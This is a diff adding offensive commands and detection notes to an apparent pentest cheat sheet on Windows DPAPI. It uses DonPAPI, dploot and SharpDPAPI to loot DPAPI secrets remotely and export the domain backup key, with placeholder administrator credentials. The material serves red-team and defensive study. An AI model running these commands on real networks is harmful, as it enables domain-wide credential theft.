@@ -21,3 +21,17 @@ DPAPI protects user/machine secrets. The **domain DPAPI backup key** (DA-held) d
 
 ### Exhaustive commands
 ```bash
+# ── Remote DPAPI looting ─────────────────────────────────────────────
+DonPAPI.py corp.local/administrator:'Password123!'@10.10.10.5
+
+# ── Retrieve the domain backup key ──────────────────────────────────
+dploot backupkeys -u administrator -p 'Password123!' -d corp.local -t 10.10.10.5
+
+# ── DSInternals backup key (on DC) ──────────────────────────────────
+SharpDPAPI.exe backupkey /server:DC01
+```
+
+### Detection
+Access to `%APPDATA%\Microsoft\Protect`; **4662** on the `BCKUPKEY` container; backup-key export audit.
+
+---
